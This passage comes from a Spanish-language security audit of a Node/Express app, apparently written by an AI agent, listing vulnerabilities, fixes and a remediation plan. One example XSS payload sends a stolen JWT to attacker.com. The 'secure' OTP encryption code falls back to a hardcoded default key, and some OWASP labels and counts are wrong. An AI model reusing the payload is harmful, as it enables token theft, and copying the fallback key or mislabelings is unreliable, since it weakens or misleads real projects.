2. Utilizar `findMany` con batch includes
3. Evitar queries adicionales después de `findMany`

#### ✨ Código Seguro

```javascript
// ✅ Versión optimizada
async function listUsers({ take = 50, skip = 0, includeInactive = false, ... } = {}) {
  const where = buildWhere(...);

  // ✅ Una sola query con select - NO N+1
  const rows = await prisma.r_user.findMany({
    where,
    take,
    skip,
    orderBy: { id_user: "desc" },
    select: {
      // Todos los campos del usuario
      id_user: true,
      ins_at: true,
      upd_at: true,
      is_active: true,
      id_company: true,
      id_role: true,
      uin: true,
      user_1: true,
      name: true,
      authentication: true,
      additional: true,
      
      // ✅ Relations: solo select los campos necesarios
      r_company: {
        select: {
          id_company: true,
          company: true,
        },
      },
      r_role: {
        select: {
          id_role: true,
          role: true,
          additional: true,
        },
      },
    },
  });

  const [total] = await Promise.all([
    prisma.r_user.count({ where }),
  ]);

  return {
    rows: rows.map(u => serializeUser(u)),  // Sin mapas adicionales
    meta: {
      take,
      skip,
      total,
      hasMore: skip + rows.length < total,
    },
  };
}

async function findUserById(id_user) {
  const row = await prisma.r_user.findUnique({
    where: { id_user: BigInt(String(id_user)) },
    select: {
      id_user: true,
      // ... todos los campos
      r_role: {
        select: {
          role: true,
          additional: true,
        },
      },
    },
  });

  return normalizeUserRecord(row);
}

// Versión alternative: usar batch loading
const DataLoader = require("dataloader");

const roleLoader = new DataLoader(async (roleIds) => {
  const roles = await prisma.r_role.findMany({
    where: { id_role: { in: roleIds } },
  });
  const map = new Map(roles.map(r => [r.id_role.toString(), r]));
  return roleIds.map(id => map.get(id.toString()));
});

const companyLoader = new DataLoader(async (companyIds) => {
  const companies = await prisma.r_company.findMany({
    where: { id_company: { in: companyIds } },
  });
  const map = new Map(companies.map(c => [c.id_company.toString(), c]));
  return companyIds.map(id => map.get(id.toString()));
});
```

#### 🔁 Dependencia
- **Performance optimization**
- **Denial of Service prevention**

---

### ÁLBUM VUACIONES ALTAS (Cont.)

*[Continuará en siguiente sección con SEC-HIGH-006 y SEC-HIGH-007]*

---

## 🟡 VULNERABILIDADES MEDIAS

### 12. ERROR HANDLING EXPONE STACK TRACES

**ID:** SEC-MED-001  
**Severidad:** 🟡 **MEDIA**  
**OWASP:** A09:2021 - Security Logging and Monitoring Failures  
**Score CVSS:** 5.3 (Medium)

#### Descripción
En modo development, el error handler expone stack traces completos. Esto revela estructura interna de la aplicación a potenciales atacantes.

#### 📁 Archivos Afectados
- **[src/app.js](src/app.js)** - Error handler (línea 33-40)

#### 🚨 Código Vulnerable
```javascript
app.use((err, req, res, next) => {
  const status = err.status || 500;

  const payload = {
    ok: false,
    error: err.message || "INTERNAL_ERROR",
  };

  // ❌ Stack trace expuesto si NODE_ENV !== "production"
  if (process.env.NODE_ENV !== "production") {
    payload.stack = err.stack;  // ❌ Revela rutas internas
  }

  res.status(status).json(payload);
});
```

#### 💥 Impacto
- Revela rutas internas del proyecto
- Expone nombres de funciones/archivos
- Facilita búsqueda de vulnerabilidades

#### ✅ Recomendación
Nunca exponer stack traces a clientes. Registrar en logs solo.

#### ✨ Código Seguro
```javascript
const fs = require("fs");
const path = require("path");

// Configurar logger
const logFile = path.join(__dirname, "../logs/error.log");
function logError(error) {
  const timestamp = new Date().toISOString();
  const message = `[${timestamp}] ${error.stack}\n`;
  fs.appendFileSync(logFile, message);
}

app.use((err, req, res, next) => {
  const status = err.status || 500;
  const requestId = req.id || crypto.randomUUID();

  // ✅ Log el error INTERNO con stack trace
  logError(err);
  console.error(`[${requestId}]`, err);

  // ✅ Cliente NUNCA ve stack trace
  const payload = {
    ok: false,
    error: status === 500 ? "INTERNAL_ERROR" : err.message,
    requestId,  // Para debugging si es necesario
  };

  // En dev, podemos enviar error_code pero NO stack
  if (process.env.NODE_ENV !== "production") {
    payload.error_code = err.code || "UNKNOWN";
    // payload.stack NO se incluye aquí
  }

  res.status(status).json(payload);
});
```

---

### 13. LOCALSTORAGE SIN PROTECCIÓN XSS

**ID:** SEC-MED-002  
**Severidad:** 🟡 **MEDIA**  
**OWASP:** A03:2021 - Injection (Client-side)  
**Score CVSS:** 5.4 (Medium)

#### Descripción
JWT token se guarda en `localStorage` que es vulnerable a XSS. Si hay XSS en la app, el atacante roba el token.

#### 📁 Archivos Afectados
- **[public/assets/js/api.js](public/assets/js/api.js)** - Línea 7 (setSession)
- **[public/assets/js/auth-client.js](public/assets/js/auth-client.js)** - Línea ~50 (saveSession)

#### 🚨 Código Vulnerable
```javascript
// api.js
function setSession(session) {
  localStorage.setItem(SESSION_KEY, JSON.stringify(session || null));  // ❌ localStorage
}

// auth-client.js
function saveSession(payload) {
  const session = {
    token: payload.token,  // ❌ JWT token en localStorage
    user: payload.user || null,
    createdAt: Date.now(),
  };
  localStorage.setItem(SESSION_KEY, JSON.stringify(session));  // ❌ XSS-able
}
```

#### 💥 Impacto - XSS Attack
```javascript
// Si hay XSS en la app
<script>
// Atacante roba el token
const session = JSON.parse(localStorage.getItem('showdeal_session'));
console.log(session.token);  // ❌ JWT token robado
fetch('http://attacker.com/steal?token=' + session.token);
</script>
```

#### ✅ Recomendación
1. Usar `sessionStorage` en lugar de `localStorage` (se borra al cerrar tab)
2. Implementar HttpOnly cookies (backend)
3. Usar Content Security Policy (CSP)

#### ✨ Código Seguro

```javascript
// Opción 1: sessionStorage (más seguro que localStorage)
function setSession(session) {
  try {
    // ✅ sessionStorage se borra al cerrar el navegador
    sessionStorage.setItem(SESSION_KEY, JSON.stringify(session || null));
  } catch (e) {
    console.error("[SESSION] Storage error:", e);
  }
}

function getSession() {
  try {
    return JSON.parse(sessionStorage.getItem(SESSION_KEY) || "null");  // ✅ sessionStorage
  } catch {
    return null;
  }
}

function clearSession() {
  try {
    sessionStorage.removeItem(SESSION_KEY);  // ✅ sessionStorage
  } catch {}
}

// Opción 2: HttpOnly cookies (MEJOR - no accesible a JavaScript)
// Backend:
res.cookie('auth_token', token, {
  httpOnly: true,     // ✅ No accessible to JavaScript
  secure: true,       // ✅ HTTPS only
  sameSite: 'lax',    // ✅ CSRF protection
  maxAge: 8 * 60 * 60 * 1000,  // 8 hours
});

// Frontend: Token se envía automáticamente con credentials:true
fetch('/api/r_user', {
  credentials: 'include'  // ✅ Envía cookies automáticamente
});

// Implementar Content Security Policy (CSP)
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
  );
  next();
});
```

---

### 14. FALTA RATE LIMITING GLOBAL

**ID:** SEC-MED-003  
**Severidad:** 🟡 **MEDIA**  
**OWASP:** A04:2021 - Insecure Deserialization (DoS)  
**Score CVSS:** 5.7 (Medium)

#### Descripción
No hay rate limiting global. Cualquiera puede bombardear la API con infinitas requests.

#### 📁 Archivos Afectados
- **[src/app.js](src/app.js)** - Falta middleware rate limiting

#### ✅ Recomendación
Implementar rate limit global + por endpoint

#### ✨ Código Seguro

```bash
npm install express-rate-limit redis
```

```javascript
// src/middleware/rateLimiter.js
const rateLimit = require("express-rate-limit");

// Rate limit global: 100 requests per 15 minutes por IP
const globalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: { ok: false, error: "TOO_MANY_REQUESTS" },
  standardHeaders: true,
  legacyHeaders: false,
});

// Rate limit más restrictivo para login
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,  // 5 intentos por 15 min
  skipSuccessfulRequests: true,  // No contar intentos exitosos
  message: { ok: false, error: "TOO_MANY_LOGIN_ATTEMPTS" },
});

module.exports = {
  globalLimiter,
  loginLimiter,
};
```

```javascript
// src/app.js
const { globalLimiter, loginLimiter } = require("./middleware/rateLimiter");

function createApp() {
  const app = express();

  app.use(helmet());
  app.use(cors({ /* config */ }));
  
  // ✅ Rate limiting global ANTES de rutas
  app.use(globalLimiter);

  app.use(express.json({ limit: "2mb" }));

  app.use("/health", healthRouter);
  app.use("/auth/login", loginLimiter, authRouter);  // ✅ Rate limit específico
  app.use("/auth", authRouter);
  app.use("/api", crudRoutes);

  // Error handler
  // ...
}
```

---

### 15. INPUT SANITIZACIÓN INCONSISTENTE

**ID:** SEC-MED-004  
**Severidad:** 🟡 **MEDIA**  
**OWASP:** A03:2021 - Injection  
**Score CVSS:** 5.1 (Medium)

#### Descripción
Algunos inputs se validan en Zod, otros solo con conversión de tipo. Hay inconsistencia en sanitización.

#### ✅ Recomendación
Sanitizar todos los inputs con Zod schemas

---

### 16. OTP SECRET SIN CIFRADO EN BD

**ID:** SEC-MED-005  
**Severidad:** 🟡 **MEDIA**  
**OWASP:** A02:2021 - Cryptographic Failures  
**Score CVSS:** 5.3 (Medium)

#### Descripción
El OTP secret se guarda en plaintext en el campo `additional` JSON. Si alguien accede a la BD, puede generar códigos OTP válidos.

#### 📁 Archivos Afectados
- **[src/auth/auth.service.js](src/auth/auth.service.js)** - Función `otpSetup()` y `otpEnable()`
- **[prisma/schema.prisma](prisma/schema.prisma)** - Campo `r_user.additional`

#### ✅ Recomendación
Cifrar OTP secret con librerías de cifrado

#### ✨ Código Seguro

```bash
npm install crypto-js
```

```javascript
const CryptoJS = require("crypto-js");

const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "default-unsafe-key";

function encryptOtpSecret(secret) {
  return CryptoJS.AES.encrypt(secret, ENCRYPTION_KEY).toString();
}

function decryptOtpSecret(encrypted) {
  const bytes = CryptoJS.AES.decrypt(encrypted, ENCRYPTION_KEY);
  return bytes.toString(CryptoJS.enc.Utf8);
}

// En otpSetup:
async function otpSetup({ id_user }) {
  const secret = authenticator.generateSecret();
  const encryptedSecret = encryptOtpSecret(secret);  // ✅ Cifrar
  
  // Guardar secret cifrado
  await prisma.r_user.update({
    where: { id_user },
    data: {
      additional: {
        ...user.additional,
        otp: {
          enabled: false,
          secret: encryptedSecret,  // ✅ Cifrado
        },
      },
    },
  });
}

// En verifyOtp:
async function verifyOtp({ challengeToken, otp }) {
  const u = await findUserById(payload.sub);
  const encryptedSecret = u.additional?.otp?.secret;
  const secret = decryptOtpSecret(encryptedSecret);  // ✅ Desencriptar
  const isValid = authenticator.check(String(otp), secret);
}
```

---

## CONTINUA ANÁLISIS...

## 🟢 VULNERABILIDADES BAJAS

### [Similar format para bajas vulnerabilidades]

---

## 📊 ANÁLISIS POR CATEGORÍA OWASP

### A01:2021 - Broken Access Control - 🔴 CRÍTICA

| ID | Vulnerabilidad | Severidad |
|----|-----------------|-----------|
| SEC-CRIT-002 | CORS sin restricciones | 🔴 Crítica |
| SEC-HIGH-003 | Falta CSRF token | 🟠 Alta |

**Recomendación General:**
- Implementar control de acceso granular
- Validar permisos en CADA endpoint
- Usar access.guard en TODAS las rutas

---

### A02:2021 - Cryptographic Failures - 🔴 CRÍTICA

| ID | Vulnerabilidad | Severidad |
|----|-----------------|-----------|
| SEC-CRIT-001 | Secrets hardcodeados | 🔴 Crítica |
| SEC-HIGH-001 | JWT sin verificación algoritmo | 🟠 Alta |
| SEC-MED-005 | OTP secret sin cifrado | 🟡 Media |

---

### A03:2021 - Injection - 🔴 CRÍTICA

| ID | Vulnerabilidad | Severidad |
|----|-----------------|-----------|
| SEC-CRIT-003 | Falta validación Zod | 🔴 Crítica |
| SEC-MED-004 | Input sanitización inconsistente | 🟡 Media |

---

### A04:2021 - Insecure Deserialization - 🟠 ALTA

| ID | Vulnerabilidad | Severidad |
|----|-----------------|-----------|
| SEC-HIGH-004 | File upload sin validación MIME | 🟠 Alta |
| SEC-HIGH-005 | N+1 queries | 🟠 Alta |

---

### A07:2021 - Identification and Authentication Failures - 🟠 ALTA

| ID | Vulnerabilidad | Severidad |
|----|-----------------|-----------|
| SEC-HIGH-002 | OTP sin rate limiting | 🟠 Alta |
| SEC-HIGH-006 | Password legacy SHA256 | 🟠 Alta |

---

### A09:2021 - Security Logging and Monitoring Failures - 🟡 MEDIA

| ID | Vulnerabilidad | Severidad |
|----|-----------------|-----------|
| SEC-MED-001 | Stack traces expuestos | 🟡 Media |

---

## 🚨 PLAN DE REMEDIACIÓN PRIORIZADO

### FASE 1 - REMEDIACIÓN INMEDIATA (24-48 horas)

**Críticas que bloquean producción:**

1. **SEC-CRIT-001** - Rotar todos los secrets
   - [ ] Cambiar DATABASE_URL (PostgreSQL password)
   - [ ] Generar nuevo JWT_SECRET (mínimo 32 caracteres)
   - [ ] Generar nuevo JWT_CHALLENGE_SECRET
   - [ ] Crear `.env.example` sin valores
   - [ ] Agregar `.env` a `.gitignore`
   - [ ] Borrar de Git history

2. **SEC-CRIT-002** - Implementar CORS whitelist
   - [ ] Definir orígenes permitidos
   - [ ] Configurar cors() con opciones
   - [ ] Testear desde origins no autorizados

3. **SEC-CRIT-003** - Agregar Zod schemas
   - [ ] Crear schemas.js con validaciones
   - [ ] Agregar a login endpoint
   - [ ] Agregar a todos los POST/PUT endpoints

### FASE 2 - VULNERABILIDADES ALTAS (1-2 semanas)

4. **SEC-HIGH-001** - Validar algoritmo JWT
5. **SEC-HIGH-002** - Implementar rate limiting OTP
6. **SEC-HIGH-003** - Implementar CSRF protection
7. **SEC-HIGH-004** - Validar file uploads
8. **SEC-HIGH-005** - Optimizar N+1 queries

### FASE 3 - VULNERABILIDADES MEDIAS (2-4 semanas)

9. **SEC-MED-001** - No exponer stack traces
10. **SEC-MED-002** - Migrar a sessionStorage
11. **SEC-MED-003** - Implementar rate limiting global
12. **SEC-MED-004** - Sanitización consistente
13. **SEC-MED-005** - Cifrar OTP secrets

---

## 📈 CHECKLIST DE IMPLEMENTACIÓN

```markdown
### FASE 1 (CRÍTICA)
- [ ] Rotar secrets en .env
- [ ] Actualizar .gitignore
- [ ] Limpiar Git history
- [ ] Implementar CORS whitelist
- [ ] Crear Zod schemas
- [ ] Validar login endpoint
- [ ] Testear CORS desde URL maliciosa
- [ ] Code review antes de deploy

### FASE 2 (ALTA)
- [ ] JWT validate algorithms
- [ ] Rate limit OTP (5 intentos/15min)
- [ ] CSRF middleware
- [ ] CSRF token en frontend
- [ ] File upload validation
- [ ] Optimize N+1 queries
- [ ] Performance testing

### FASE 3 (MEDIA)
- [ ] Error handler sin stack traces
- [ ] Migrar a sessionStorage
- [ ] Global rate limiter
- [ ] Input sanitization audit
- [ ] OTP secret encryption
- [ ] Security headers audit
- [ ] Penetration testing

### FASE 4 (BAJA)
- [ ] Legacy password migration
- [ ] Index optimization
- [ ] Indices deduplication
- [ ] Documentation update
```

---

## 🔍 RECOMENDACIONES ADICIONALES

### Seguridad Operacional

1. **Implementar Security Headers**
   ```javascript
   app.use((req, res, next) => {
     res.setHeader('X-Content-Type-Options', 'nosniff');
     res.setHeader('X-Frame-Options', 'DENY');
     res.setHeader('X-XSS-Protection', '1; mode=block');
     res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
     next();
   });
   ```

2. **Logging de Seguridad**
   - Registrar TODOS los login attempts
   - Registrar cambios de permisos
   - Registrar acceso a datos sensibles
   - Alertar de múltiples fallos de autenticación

3. **Monitoreo**
   - Alert si JWT_SECRET cambia
   - Alert si acceso a BD fallida
   - Alert si rate limit activado
   - Dashboard de eventos de seguridad

4. **Testing de Seguridad**
   - Automático: OWASP ZAP
   - Manual: Penetration testing
   - Dependency: npm audit regularly

---

## 📚 REFERENCIAS

- **OWASP Top 10 2021**: https://owasp.org/Top10/
- **JWT Best Practices**: https://tools.ietf.org/html/rfc8725
- **Node.js Security**: https://nodejs.org/es/docs/guides/security/
- **Express Security**: https://expressjs.com/es/advanced/best-practice-security.html

---

## 🎯 CONCLUSIÓN

**Estado Actual:** 🔴 **NO APTO PARA PRODUCCIÓN**

El proyecto ShowDeal presenta **3 vulnerabilidades críticas** que deben ser remediadas inmediatamente:
1. Secrets hardcodeados
2. CORS abierto
3. Falta validación de entrada

Adicional mente, hay **7 vulnerabilidades altas** que requieren corrección urgente antes de cualquier deploy.

**Próximas acciones recomendadas:**
1. Reunión de seguridad con equipo
2. Comenzar FASE 1 (48 horas)
3. Seguridad testing después de cada fix
4. Implementar CI/CD security checks

---

**Auditoría completada:** 19 de Abril de 2026  
**Auditor:** QA Specialist Agent  
**Confidencialidad:** INTERNAL USE ONLY
